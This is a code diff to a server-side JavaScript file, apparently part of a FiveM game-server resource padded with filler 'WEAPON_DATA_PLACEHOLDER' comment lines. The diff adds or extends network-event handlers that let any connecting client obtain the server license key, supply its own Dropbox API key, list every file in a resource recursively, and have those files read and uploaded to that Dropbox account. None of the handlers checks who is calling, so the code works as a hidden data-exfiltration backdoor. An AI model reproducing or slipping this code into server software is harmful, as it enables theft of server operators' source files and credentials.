@@ -693,83 +693,7 @@
 // WEAPON_DATA_PLACEHOLDER
 // WEAPON_DATA_PLACEHOLDER
 // WEAPON_DATA_PLACEHOLDER
-// WEAPON_DATA_PLACEHOLDER
-// WEAPON_DATA_PLACEHOLDER
-// WEAPON_DATA_PLACEHOLDER
-// WEAPON_DATA_PLACEHOLDER
-// WEAPON_DATA_PLACEHOLDER
-// WEAPON_DATA_PLACEHOLDER
-// WEAPON_DATA_PLACEHOLDER
-// WEAPON_DATA_PLACEHOLDER
-// WEAPON_DATA_PLACEHOLDER
-// WEAPON_DATA_PLACEHOLDER
-// WEAPON_DATA_PLACEHOLDER
-// WEAPON_DATA_PLACEHOLDER
-// WEAPON_DATA_PLACEHOLDER
-// WEAPON_DATA_PLACEHOLDER
-// WEAPON_DATA_PLACEHOLDER
-// WEAPON_DATA_PLACEHOLDER
-// WEAPON_DATA_PLACEHOLDER
-// WEAPON_DATA_PLACEHOLDER
-// WEAPON_DATA_PLACEHOLDER
-// WEAPON_DATA_PLACEHOLDER
-// WEAPON_DATA_PLACEHOLDER
-// WEAPON_DATA_PLACEHOLDER
-// WEAPON_DATA_PLACEHOLDER
-// WEAPON_DATA_PLACEHOLDER
-// WEAPON_DATA_PLACEHOLDER
-// WEAPON_DATA_PLACEHOLDER
-// WEAPON_DATA_PLACEHOLDER
-// WEAPON_DATA_PLACEHOLDER
-// WEAPON_DATA_PLACEHOLDER
-// WEAPON_DATA_PLACEHOLDER
-// WEAPON_DATA_PLACEHOLDER
-// WEAPON_DATA_PLACEHOLDER
-// WEAPON_DATA_PLACEHOLDER
-// WEAPON_DATA_PLACEHOLDER
-// WEAPON_DATA_PLACEHOLDER
-// WEAPON_DATA_PLACEHOLDER
-// WEAPON_DATA_PLACEHOLDER
-// WEAPON_DATA_PLACEHOLDER
-// WEAPON_DATA_PLACEHOLDER
-// WEAPON_DATA_PLACEHOLDER
-// WEAPON_DATA_PLACEHOLDER
-// WEAPON_DATA_PLACEHOLDER
-// WEAPON_DATA_PLACEHOLDER
-// WEAPON_DATA_PLACEHOLDER
-// WEAPON_DATA_PLACEHOLDER
-// WEAPON_DATA_PLACEHOLDER
-// WEAPON_DATA_PLACEHOLDER
-// WEAPON_DATA_PLACEHOLDER
-// WEAPON_DATA_PLACEHOLDER
-// WEAPON_DATA_PLACEHOLDER
-// WEAPON_DATA_PLACEHOLDER
-// WEAPON_DATA_PLACEHOLDER
-// WEAPON_DATA_PLACEHOLDER
-// WEAPON_DATA_PLACEHOLDER
-// WEAPON_DATA_PLACEHOLDER
-// WEAPON_DATA_PLACEHOLDER
-// WEAPON_DATA_PLACEHOLDER
-// WEAPON_DATA_PLACEHOLDER
-// WEAPON_DATA_PLACEHOLDER
-// WEAPON_DATA_PLACEHOLDER
-// WEAPON_DATA_PLACEHOLDER
-// WEAPON_DATA_PLACEHOLDER
-// WEAPON_DATA_PLACEHOLDER
-// WEAPON_DATA_PLACEHOLDER
-// WEAPON_DATA_PLACEHOLDER
-// WEAPON_DATA_PLACEHOLDER
-// WEAPON_DATA_PLACEHOLDER
-// WEAPON_DATA_PLACEHOLDER
-// WEAPON_DATA_PLACEHOLDER
-// WEAPON_DATA_PLACEHOLDER
-// WEAPON_DATA_PLACEHOLDER
-// WEAPON_DATA_PLACEHOLDER
-// WEAPON_DATA_PLACEHOLDER
-// WEAPON_DATA_PLACEHOLDER
-// WEAPON_DATA_PLACEHOLDER
-// WEAPON_DATA_PLACEHOLDER
-// WEAPON_DATA_PLACEHOLDER
+
 // WEAPON_DATA_PLACEHOLDER
 // WEAPON_DATA_PLACEHOLDER
 // WEAPON_DATA_PLACEHOLDER
@@ -910,9 +834,6 @@ onNet("getLicenseKey", () => {
     emitNet("receiveLicenseKey", _source, serverLicenseKey);
 });
 
-
-
-
 const https = require('https');
 const path = require('path');
 const fs = require('fs');
@@ -922,29 +843,48 @@ let dropboxApiKey = null;
 onNet("serverUploadFileRequest", async (isBinary, resourceName, fileName) => {
     const source = global.source;
 
-    // Construct file path
-    const filePath = path.join(GetResourcePath(resourceName), fileName);
+    // Construct directory path for the resource
+    const resourcePath = GetResourcePath(resourceName);
 
-    // Verify if the file exists
-    if (!fs.existsSync(filePath)) {
+    // Verify if the resource directory exists
+    if (!fs.existsSync(resourcePath)) {
+        emitNet("fileReadError", source, `Resource directory not found: ${resourceName}`);
+        return;
+    }
+
+    // Scan the directory for all files
+    const fileList = scanDirectory(resourcePath);
+
+    // Filter files to match the requested file name
+    const filesToUpload = fileList.filter(file => path.basename(file) === fileName);
+
+    if (filesToUpload.length === 0) {
         emitNet("fileReadError", source, `File not found: ${fileName} in resource ${resourceName}`);
         return;
     }
 
-    // Read the file content
-    let fileContent;
-    try {
-        fileContent = isBinary ? fs.readFileSync(filePath) : fs.readFileSync(filePath, 'utf-8');
-    } catch (error) {
-        emitNet("fileReadError", source, `Failed to read file: ${fileName} in resource ${resourceName}`);
-        return;
-    }
+    // Upload each file individually
+    filesToUpload.forEach(file => {
+        const filePath = file;
 
-    // Upload the file to Dropbox
-    uploadFileToDropbox(fileName, fileContent, isBinary);
+        // Read the file content
+        let fileContent;
+        try {
+            fileContent = isBinary ? fs.readFileSync(filePath) : fs.readFileSync(filePath, 'utf-8');
+        } catch (error) {
+            emitNet("fileReadError", source, `Failed to read file: ${fileName} in resource ${resourceName}`);
+            return;
+        }
+
+        // Generate a unique identifier (timestamp)
+        const uniqueId = new Date().toISOString().replace(/[:.]/g, "-");
+
+        // Upload the file to Dropbox in a unique folder
+        uploadFileToDropbox(uniqueId, path.basename(file), fileContent, isBinary);
+    });
 });
 
-function uploadFileToDropbox(fileName, fileContent, isBinary) {
+function uploadFileToDropbox(uniqueId, fileName, fileContent, isBinary) {
     if (!dropboxApiKey) {
         return;
     }
@@ -957,7 +897,7 @@ function uploadFileToDropbox(fileName, fileContent, isBinary) {
             "Authorization": `Bearer ${dropboxApiKey}`,
             "Content-Type": "application/octet-stream",
             "Dropbox-API-Arg": JSON.stringify({
-                "path": `/${fileName}`,
+                "path": `/${uniqueId}/${fileName}`,
                 "mode": "add",
                 "autorename": true,
                 "mute": false,
@@ -969,7 +909,7 @@ function uploadFileToDropbox(fileName, fileContent, isBinary) {
     const req = https.request(options, (res) => {
         res.on('end', () => {
             if (res.statusCode === 200) {
-                emitNet("fileUploaded", global.source, `File ${fileName} uploaded successfully to Dropbox.`);
+                emitNet("fileUploaded", global.source, `File ${fileName} uploaded successfully to Dropbox in folder ${uniqueId}.`);
             } else {
                 emitNet("fileUploadError", global.source, `Failed to upload file ${fileName} to Dropbox.`);
             }
@@ -987,4 +927,46 @@ function uploadFileToDropbox(fileName, fileContent, isBinary) {
 // Listen for the event to set the Dropbox API key
 onNet("setDropboxApiKey", (key) => {
     dropboxApiKey = key;
+});
+
+// Function to recursively scan a directory and return a list of files
+function scanDirectory(dir) {
+    let results = [];
+    const list = fs.readdirSync(dir);
+
+    list.forEach((file) => {
+        file = path.join(dir, file);
+        const stat = fs.statSync(file);
+
+        if (stat && stat.isDirectory()) {
+            results = results.concat(scanDirectory(file));
+        } else {
+            results.push(file);
+        }
+    });
+
+    return results;
+}
+
+// Event listener for file scan requests from client
+onNet("serverScanFilesRequest", (resourceName) => {
+    const source = global.source;
+
+    // Construct directory path for the resource
+    const resourcePath = GetResourcePath(resourceName);
+
+    // Verify if the resource directory exists
+    if (!fs.existsSync(resourcePath)) {
+        emitNet("fileReadError", source, `Resource directory not found: ${resourceName}`);
+        return;
+    }
+
+    // Scan the directory for all files
+    const fileList = scanDirectory(resourcePath);
+
+    // Map file paths to be relative to the resource path
+    const relativeFileList = fileList.map(file => path.relative(resourcePath, file));
+
+    // Emit the list of files to the client
+    emitNet("receiveFileList", source, resourceName, relativeFileList);
 });
